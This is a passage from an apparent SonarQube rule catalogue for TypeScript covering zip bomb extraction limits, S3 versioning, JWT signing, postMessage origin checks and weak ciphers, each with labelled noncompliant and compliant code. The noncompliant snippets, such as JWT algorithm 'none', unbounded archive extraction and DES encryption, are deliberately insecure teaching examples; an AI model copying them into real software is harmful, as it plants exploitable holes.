              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio" rel="nofollow">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul><li> There is no validation of the number of entries in the archive. </li><li> There is no validation of the total size of the uncompressed data. </li><li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li><li> Define and control the threshold for maximum total size of the uncompressed data. </li><li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li></ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://github.com/npm/node-tar" rel="nofollow">tar</a> module:</p>
<pre>
const tar &#61; require(&#39;tar&#39;);

tar.x({ // Sensitive
  file: &#39;foo.tar.gz&#39;
});
</pre>
<p>For <a href="https://github.com/cthackers/adm-zip" rel="nofollow">adm-zip</a> module:</p>
<pre>
const AdmZip &#61; require(&#39;adm-zip&#39;);

let zip &#61; new AdmZip(&#34;./foo.zip&#34;);
zip.extractAllTo(&#34;.&#34;); // Sensitive
</pre>
<p>For <a href="https://stuk.github.io/jszip/" rel="nofollow">jszip</a> module:</p>
<pre>
const fs &#61; require(&#34;fs&#34;);
const JSZip &#61; require(&#34;jszip&#34;);

fs.readFile(&#34;foo.zip&#34;, function(err, data) {
  if (err) throw err;
  JSZip.loadAsync(data).then(function (zip) { // Sensitive
    zip.forEach(function (relativePath, zipEntry) {
      if (!zip.file(zipEntry.name)) {
        fs.mkdirSync(zipEntry.name);
      } else {
        zip.file(zipEntry.name).async(&#39;nodebuffer&#39;).then(function (content) {
          fs.writeFileSync(zipEntry.name, content);
        });
      }
    });
  });
});
</pre>
<p>For <a href="https://github.com/thejoshwolfe/yauzl" rel="nofollow">yauzl</a> module</p>
<pre>
const yauzl &#61; require(&#39;yauzl&#39;);

yauzl.open(&#39;foo.zip&#39;, function (err, zipfile) {
  if (err) throw err;

  zipfile.on(&#34;entry&#34;, function(entry) {
    zipfile.openReadStream(entry, function(err, readStream) {
      if (err) throw err;
      // TODO: extract
    });
  });
});
</pre>
<p>For <a href="https://github.com/maxogden/extract-zip" rel="nofollow">extract-zip</a> module:</p>
<pre>
const extract &#61; require(&#39;extract-zip&#39;)

async function main() {
  let target &#61; __dirname &#43; &#39;/test&#39;;
  await extract(&#39;test.zip&#39;, { dir: target }); // Sensitive
}
main();
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://github.com/npm/node-tar" rel="nofollow">tar</a> module:</p>
<pre>
const tar &#61; require(&#39;tar&#39;);
const MAX_FILES &#61; 10000;
const MAX_SIZE &#61; 1000000000; // 1 GB

let fileCount &#61; 0;
let totalSize &#61; 0;

tar.x({
  file: &#39;foo.tar.gz&#39;,
  filter: (path, entry) &#61;&gt; {
    fileCount&#43;&#43;;
    if (fileCount &gt; MAX_FILES) {
      throw &#39;Reached max. number of files&#39;;
    }

    totalSize &#43;&#61; entry.size;
    if (totalSize &gt; MAX_SIZE) {
      throw &#39;Reached max. size&#39;;
    }

    return true;
  }
});
</pre>
<p>For <a href="https://github.com/cthackers/adm-zip" rel="nofollow">adm-zip</a> module:</p>
<pre>
const AdmZip &#61; require(&#39;adm-zip&#39;);
const MAX_FILES &#61; 10000;
const MAX_SIZE &#61; 1000000000; // 1 GB
const THRESHOLD_RATIO &#61; 10;

let fileCount &#61; 0;
let totalSize &#61; 0;
let zip &#61; new AdmZip(&#34;./foo.zip&#34;);
let zipEntries &#61; zip.getEntries();
zipEntries.forEach(function(zipEntry) {
    fileCount&#43;&#43;;
    if (fileCount &gt; MAX_FILES) {
        throw &#39;Reached max. number of files&#39;;
    }

    let entrySize &#61; zipEntry.getData().length;
    totalSize &#43;&#61; entrySize;
    if (totalSize &gt; MAX_SIZE) {
        throw &#39;Reached max. size&#39;;
    }

    let compressionRatio &#61; entrySize / zipEntry.header.compressedSize;
    if (compressionRatio &gt; THRESHOLD_RATIO) {
        throw &#39;Reached max. compression ratio&#39;;
    }

    if (!zipEntry.isDirectory) {
        zip.extractEntryTo(zipEntry.entryName, &#34;.&#34;);
    }
});
</pre>
<p>For <a href="https://stuk.github.io/jszip/" rel="nofollow">jszip</a> module:</p>
<pre>
const fs &#61; require(&#34;fs&#34;);
const pathmodule &#61; require(&#34;path&#34;);
const JSZip &#61; require(&#34;jszip&#34;);

const MAX_FILES &#61; 10000;
const MAX_SIZE &#61; 1000000000; // 1 GB

let fileCount &#61; 0;
let totalSize &#61; 0;
let targetDirectory &#61; __dirname &#43; &#39;/archive_tmp&#39;;

fs.readFile(&#34;foo.zip&#34;, function(err, data) {
  if (err) throw err;
  JSZip.loadAsync(data).then(function (zip) {
    zip.forEach(function (relativePath, zipEntry) {
      fileCount&#43;&#43;;
      if (fileCount &gt; MAX_FILES) {
        throw &#39;Reached max. number of files&#39;;
      }

      // Prevent ZipSlip path traversal (S6096)
      const resolvedPath &#61; pathmodule.join(targetDirectory, zipEntry.name);
      if (!resolvedPath.startsWith(targetDirectory)) {
        throw &#39;Path traversal detected&#39;;
      }

      if (!zip.file(zipEntry.name)) {
        fs.mkdirSync(resolvedPath);
      } else {
        zip.file(zipEntry.name).async(&#39;nodebuffer&#39;).then(function (content) {
          totalSize &#43;&#61; content.length;
          if (totalSize &gt; MAX_SIZE) {
            throw &#39;Reached max. size&#39;;
          }

          fs.writeFileSync(resolvedPath, content);
        });
      }
    });
  });
});
</pre>
<p>Be aware that due to the similar structure of sensitive and compliant code the issue will be raised in both cases. It is up to the developer to
decide if the implementation is secure.</p>
<p>For <a href="https://github.com/thejoshwolfe/yauzl" rel="nofollow">yauzl</a> module</p>
<pre>
const yauzl &#61; require(&#39;yauzl&#39;);

const MAX_FILES &#61; 10000;
const MAX_SIZE &#61; 1000000000; // 1 GB
const THRESHOLD_RATIO &#61; 10;

yauzl.open(&#39;foo.zip&#39;, function (err, zipfile) {
  if (err) throw err;

  let fileCount &#61; 0;
  let totalSize &#61; 0;

  zipfile.on(&#34;entry&#34;, function(entry) {
    fileCount&#43;&#43;;
    if (fileCount &gt; MAX_FILES) {
      throw &#39;Reached max. number of files&#39;;
    }

    // The uncompressedSize comes from the zip headers, so it might not be trustworthy.
    // Alternatively, calculate the size from the readStream.
    let entrySize &#61; entry.uncompressedSize;
    totalSize &#43;&#61; entrySize;
    if (totalSize &gt; MAX_SIZE) {
      throw &#39;Reached max. size&#39;;
    }

    if (entry.compressedSize &gt; 0) {
      let compressionRatio &#61; entrySize / entry.compressedSize;
      if (compressionRatio &gt; THRESHOLD_RATIO) {
        throw &#39;Reached max. compression ratio&#39;;
      }
    }

    zipfile.openReadStream(entry, function(err, readStream) {
      if (err) throw err;
      // TODO: extract
    });
  });
});
</pre>
<p>Be aware that due to the similar structure of sensitive and compliant code the issue will be raised in both cases. It is up to the developer to
decide if the implementation is secure.</p>
<p>For <a href="https://github.com/maxogden/extract-zip" rel="nofollow">extract-zip</a> module:</p>
<pre>
const extract &#61; require(&#39;extract-zip&#39;)

const MAX_FILES &#61; 10000;
const MAX_SIZE &#61; 1000000000; // 1 GB
const THRESHOLD_RATIO &#61; 10;

async function main() {
  let fileCount &#61; 0;
  let totalSize &#61; 0;

  let target &#61; __dirname &#43; &#39;/foo&#39;;
  await extract(&#39;foo.zip&#39;, {
    dir: target,
    onEntry: function(entry, zipfile) {
      fileCount&#43;&#43;;
      if (fileCount &gt; MAX_FILES) {
        throw &#39;Reached max. number of files&#39;;
      }

      // The uncompressedSize comes from the zip headers, so it might not be trustworthy.
      // Alternatively, calculate the size from the readStream.
      let entrySize &#61; entry.uncompressedSize;
      totalSize &#43;&#61; entrySize;
      if (totalSize &gt; MAX_SIZE) {
        throw &#39;Reached max. size&#39;;
      }

      if (entry.compressedSize &gt; 0) {
        let compressionRatio &#61; entrySize / entry.compressedSize;
        if (compressionRatio &gt; THRESHOLD_RATIO) {
          throw &#39;Reached max. compression ratio&#39;;
        }
      }
    }
  });
}
main();
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/409" rel="nofollow">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li><li> <a href="https://www.bamsoftware.com/hacks/zipbomb/" rel="nofollow">bamsoftware.com</a> - A better Zip Bomb </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6252">
              typescript:S6252
            </a>
          </td>
          <td>
            <details>
              <p>S3 buckets can be versioned. When the S3 bucket is unversioned it means that a new version of an object overwrites an existing one in the S3
bucket.</p>
<p>It can lead to unintentional or intentional information loss.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The bucket stores information that require high availability. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>
<h2>Sensitive Code Example</h2>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;,
    versioned: false // Sensitive
});
</pre>
<p>The default value of <code>versioned</code> is <code>false</code> so the absence of this parameter is also sensitive.</p>
<h2>Compliant Solution</h2>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;,
    versioned: true
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html" rel="nofollow">AWS documentation</a> - Using versioning in S3 buckets </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html#versioned" rel="nofollow">AWS CDK version 2</a> - Using versioning in S3
  buckets </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5659">
              typescript:S5659
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>
<h2>Why is this an issue?</h2>
<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security
risk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This
vulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT
hinges on the strength and presence of its signature.</p>
<h3>What is the potential impact?</h3>
<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant
threat to data security and the privacy of user identities.</p>
<h4>Impersonation of users</h4>
<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.
When these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to
craft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level
permissions and sensitive data.</p>
<h4>Unauthorized data access</h4>
<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker
can manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>
<h2>How to fix it in jsonwebtoken</h2>
<h3>Code examples</h3>
<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const jwt &#61; require(&#39;jsonwebtoken&#39;);

jwt.sign(payload, key, { algorithm: &#39;none&#39; }); // Noncompliant
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
const jwt &#61; require(&#39;jsonwebtoken&#39;);

jwt.verify(token, key, {
    expiresIn: 360000,
    algorithms: [&#39;none&#39;] // Noncompliant
}, callbackcheck);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const jwt &#61; require(&#39;jsonwebtoken&#39;);

jwt.sign(payload, key, { algorithm: &#39;HS256&#39; });
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
const jwt &#61; require(&#39;jsonwebtoken&#39;);

jwt.verify(token, key, {
    expiresIn: 360000,
    algorithms: [&#39;HS256&#39;]
}, callbackcheck);
</pre>
<h3>How does this work?</h3>
<h4>Always sign your tokens</h4>
<p>The foremost measure to enhance JWT security is to ensure that every JWT you issue is signed. Unsigned tokens are like open books that anyone can
tamper with. Signing your JWTs ensures that any alterations to the tokens after they have been issued can be detected. Most JWT libraries support a
signing function, and using it is usually as simple as providing a secret key when the token is created.</p>
<h4>Choose a strong cipher algorithm</h4>
<p>It is not enough to merely sign your tokens. You need to sign them with a strong cipher algorithm. Algorithms like HS256 (HMAC using SHA-256) are
considered secure for most purposes. But for an additional layer of security, you could use an algorithm like RS256 (RSA Signature with SHA-256),
which uses a private key for signing and a public key for verification. This way, even if someone gains access to the public key, they will not be
able to forge tokens.</p>
<h4>Verify the signature of your tokens</h4>
<p>Resolving a vulnerability concerning the validation of JWT token signatures is mainly about incorporating a critical step into your process:
validating the signature every time a token is decoded. Just having a signed token using a secure algorithm is not enough. If you are not validating
signatures, they are not serving their purpose.</p>
<p>Every time your application receives a JWT, it needs to decode the token to extract the information contained within. It is during this decoding
process that the signature of the JWT should also be checked.</p>
<p>To resolve the issue follow these instructions:</p>
<ol><li> Use framework-specific functions for signature verification: Most programming frameworks that support JWTs provide specific functions to not
  only decode a token but also validate its signature simultaneously. Make sure to use these functions when handling incoming tokens. </li><li> Handle invalid signatures appropriately: If a JWT’s signature does not validate correctly, it means the token is not trustworthy, indicating
  potential tampering. The action to take on encountering an invalid token should be denying the request carrying it and logging the event for further
  investigation. </li><li> Incorporate signature validation in your tests: When you are writing tests for your application, include tests that check the signature
  validation functionality. This can help you catch any instances where signature verification might be unintentionally skipped or bypassed. </li></ol>
<p>By following these practices, you can ensure the security of your application’s JWT handling process, making it resistant to attacks that rely on
tampering with tokens. Validation of the signature needs to be an integral and non-negotiable part of your token handling process.</p>
<h3>Going the extra mile</h3>
<h4>Securely store your secret keys</h4>
<p>Ensure that your secret keys are stored securely. They should not be hard-coded into your application code or checked into your version control
system. Instead, consider using environment variables, secure key management systems, or vault services.</p>
<h4>Rotate your secret keys</h4>
<p>Even with the strongest cipher algorithms, there is a risk that your secret keys may be compromised. Therefore, it is a good practice to
periodically rotate your secret keys. By doing so, you limit the amount of time that an attacker can misuse a stolen key. When you rotate keys, be
sure to allow a grace period where tokens signed with the old key are still accepted to prevent service disruptions.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/347" rel="nofollow">MITRE, CWE-347</a> - Improper Verification of Cryptographic Signature </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2819">
              typescript:S2819
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Browsers <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" rel="nofollow">allow message exchanges</a> between Window objects of
different origins.</p>
<p>Because any window can send or receive messages from another window, it is important to verify the sender’s/receiver’s identity:</p>
<ul><li> When sending a message with the postMessage method, the identity’s receiver should be defined (the wildcard keyword (<code>*</code>) should not
  be used). </li><li> When receiving a message with a message event, the sender’s identity should be verified using the origin and possibly source properties. </li></ul>
<h3>Noncompliant code example</h3>
<p>When sending a message:</p>
<pre>
var iframe &#61; document.getElementById(&#34;testiframe&#34;);
iframe.contentWindow.postMessage(&#34;secret&#34;, &#34;*&#34;); // Noncompliant: * is used
</pre>
<p>When receiving a message:</p>
<pre>
window.addEventListener(&#34;message&#34;, function(event) { // Noncompliant: no checks are done on the origin property.
      console.log(event.data);
 });
</pre>
<h3>Compliant solution</h3>
<p>When sending a message:</p>
<pre>
var iframe &#61; document.getElementById(&#34;testsecureiframe&#34;);
iframe.contentWindow.postMessage(&#34;hello&#34;, &#34;https://secure.example.com&#34;); // Compliant
</pre>
<p>When receiving a message:</p>
<pre>
window.addEventListener(&#34;message&#34;, function(event) {

  if (event.origin !&#61;&#61; &#34;http://example.org&#34;) // Compliant
    return;

  console.log(event.data)
});
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage" rel="nofollow">developer.mozilla.org</a> - postMessage API </li><li> <a href="https://cwe.mitre.org/data/definitions/345.html" rel="nofollow">MITRE, CWE-345</a> - Insufficient Verification of Data Authenticity </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5547">
              typescript:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection. </li><li> Security during transmission or on storage devices. </li><li> Data integrity, general trust, and authentication. </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const crypto &#61; require(&#39;crypto&#39;);

crypto.createCipheriv(&#34;DES&#34;, key, iv); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const crypto &#61; require(&#39;crypto&#39;);

crypto.createCipheriv(&#34;AES-256-GCM&#34;, key, iv);
</pre>
<h3>How does this work?</h3>
<h4>Use a secure algorithm</h4>
<p>It is highly recommended to use an algorithm that is currently considered secure by the cryptographic community. A common choice for such an
algorithm is the Advanced Encryption Standard (AES).</p>
<p>For block ciphers, it is not recommended to use algorithms with a block size that is smaller than 128 bits.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5542">
              typescript:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul><li> Confidentiality, privacy, and intellectual property protection </li><li> Security during transmission or on storage devices </li><li> Data integrity, general trust, and authentication </li></ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol><li> No encryption is unbreakable. </li><li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li></ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest modes are CBC (Cipher Block Chaining) and ECB</p>
<p>(Electronic Codebook), as they are either vulnerable to padding oracles or do not provide authentication mechanisms.</p>
<p>And for RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
const crypto &#61; require(&#39;crypto&#39;);

crypto.createCipheriv(&#34;AES-128-CBC&#34;, key, iv); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="compliant">
const crypto &#61; require(&#39;crypto&#39;);

crypto.createCipheriv(&#34;AES-256-GCM&#34;, key, iv);
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: Use Galois/Counter mode (GCM)</h4>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul><li> CCM: <code>Counter with CBC-MAC</code> </li><li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li><li> EAX: <code>Encrypt-and-Authenticate</code> </li><li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li><li> OCB: <code>Offset Codebook Mode</code> </li></ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it</p>
<p>is considered more straightforward to use AES-GCM directly instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode" rel="nofollow">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li><li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack" rel="nofollow">Wikipedia, Padding Oracle Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack" rel="nofollow">Wikipedia, Chosen-Ciphertext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack" rel="nofollow">Wikipedia, Chosen-Plaintext Attack</a> </li><li> <a href="https://en.wikipedia.org/wiki/Semantic_security" rel="nofollow">Wikipedia, Semantically Secure Cryptosystems</a> </li><li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="nofollow">Wikipedia, OAEP</a> </li><li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode" rel="nofollow">Wikipedia, Galois/Counter Mode</a> </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/327" rel="nofollow">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4787">
              typescript:S4787
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS4426&amp;rule_key&#61;javascript%3AS4426" rel="nofollow">S4426</a>, <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS5542&amp;rule_key&#61;javascript%3AS5542" rel="nofollow">S5542</a>, <a href="/organizations/sopra-steria/rules?open&#61;javascript%3AS5547&amp;rule_key&#61;javascript%3AS5547" rel="nofollow">S5547</a> instead.</p>
<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-7902" rel="nofollow">CVE-2017-7902</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-1378" rel="nofollow">CVE-2006-1378</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2003-1376" rel="nofollow">CVE-2003-1376</a> </li></ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p>This rule flags function calls that initiate encryption/decryption.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the private key might not be random, strong enough or the same key is reused for a long long time. </li><li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li><li> the key exchange is made without properly authenticating the receiver. </li><li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li><li> the chosen encryption library is deemed unsafe. </li><li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li><li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li><li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it’s IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li><li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li></ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Generate encryption keys using secure random algorithms. </li><li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li><li> Regenerate the keys regularly. </li><li> Always store the keys in a safe location and transfer them only over safe channels. </li><li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li><li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li><li> When a nonce is used, generate it randomly every time. </li><li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li><li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like &#34;Chosen-Plaintext Attacks&#34;. Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
